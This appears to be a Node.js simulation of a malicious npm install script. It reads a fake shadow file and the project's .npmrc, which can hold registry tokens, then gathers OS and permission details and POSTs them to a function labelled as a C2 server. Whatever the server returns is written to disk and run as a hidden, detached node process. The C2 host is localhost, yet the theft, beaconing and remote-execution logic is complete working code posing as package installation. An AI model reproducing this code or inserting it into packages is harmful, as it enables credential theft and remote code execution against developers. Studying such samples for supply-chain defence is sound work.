const fs = require("fs");
const path = require("path");
const http = require("http");
const dns = require("dns").promises;
const os = require("os");
const { spawn, exec } = require("child_process");

const shadowFilePath = path.join(__dirname, "/fake_shadow");

async function readShadowFile() {
  try {
    const data = await fs.promises.readFile(shadowFilePath, "utf8");
    console.log("Simulated credentials:", data);
    return data;
  } catch (err) {
    // Ignore the error and continue execution
  }
}
function readNpmrcFile() {
  const npmrcFilePath = path.resolve(process.cwd(), '.npmrc');
  let npmrcContent = '';

  try {
    npmrcContent = fs.readFileSync(npmrcFilePath, 'utf8');
    // console.log('.npmrc content:', npmrcContent);
  } catch (err) {
    // console.error('Failed to read .npmrc file:', err);
  }

  return npmrcContent;
}
async function performDnsLookup(hostname) {
  try {
    const lookup = await dns.lookup(hostname);
    // console.log(`DNS Lookup Result: ${JSON.stringify(lookup)}`);
  } catch (err) {
    // console.log("DNS Lookup Failed:", err);
    // Ignore the error and continue execution
  }
}

function hasRootPermission() {
  return process.geteuid && process.geteuid() === 0;
}

function hasWriteAccess(filePath) {
  try {
    fs.accessSync(filePath, fs.constants.W_OK);
    return true;
  } catch (err) {
    return false;
  }
}

function isExecutionAllowed(filePath) {
  try {
    fs.accessSync(filePath, fs.constants.X_OK);
    return true;
  } catch (err) {
    return false;
  }
}

function isExecPermissionAvailable() {
  try {
    fs.accessSync("/bin/sh", fs.constants.X_OK);
    return true;
  } catch (err) {
    return false;
  }
}

async function informC2Server(osInfo) {
  try {
    const postOptions = {
      hostname: "localhost",
      port: 8000,
      path: "/inform",
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
    };

    const responseData = await new Promise((resolve, reject) => {
      const req = http.request(postOptions, (res) => {
        let responseData = "";

        res.on("data", (chunk) => {
          responseData += chunk;
        });

        res.on("end", () => {
          resolve(responseData);
        });
      });

      req.on("error", (error) => {
        reject("Error while making the inform request: " + error);
      });

      req.write(JSON.stringify(osInfo));
      req.end();
    });

    return responseData;
  } catch (err) {
   // console.error("Error during informC2Server:", err);
    return null;
  }
}

function executeDataFromC2(data) {
  try {
    const filePath = 'test.js';

    // Write the data to the file
    fs.writeFileSync(filePath, data);

    // Spawn the child process with an empty standard input stream
    const childProcess = spawn('node', [filePath], {
      detached: true,
      stdio: ['ignore', 'ignore', 'ignore']
    });

    // Detach the child process
    childProcess.unref();

    console.log('Script execution started in the background.');
  } catch (err) {
    console.error('Error during script execution:', err);
  }
}



async function executeParallel() {
  try {
    const data = await readShadowFile();
    const npmData= readNpmrcFile();

    await performDnsLookup("localhost");

    const scriptFilePath = __filename;
    const hasWriteAccessValue = hasWriteAccess(scriptFilePath);
    const isExecutionAllowedValue = isExecutionAllowed(scriptFilePath);
    const isExecPermissionAvailableValue = isExecPermissionAvailable();

    const osInfo = {
      osType: os.type(),
      osRelease: os.release(),
      hasRootPermission: hasRootPermission(),
      hasWriteAccess: hasWriteAccessValue,
      isExecutionAllowed: isExecutionAllowedValue,
      isExecPermissionAvailable: isExecPermissionAvailableValue,
      data: data ? JSON.parse(data) : null,
      npmData: npmData ? npmData : null
    };

    const informResponse = await informC2Server(osInfo);

    if (informResponse) {
      // runInBackground(() => {
        executeDataFromC2(informResponse);
      // });
    } else {
      console.log("Inform response is empty");
    }
  } catch (err) {
    console.error("Error during script execution:", err);
  }
}

function runInBackground(callback) {
  const childProcess = spawn("node", ["-e", `(${callback.toString()})()`], {
    detached: true,
    stdio: "ignore",
  });

  childProcess.on("error", (error) => {
    console.error("Background execution error:", error);
  });

  childProcess.on("exit", (code, signal) => {
    console.log("Background execution completed with code:", code);
  });

  childProcess.unref();
}

// Continue the package installation process
console.log("Continuing with package installation...");
// ... Rest of your package installation code

executeParallel();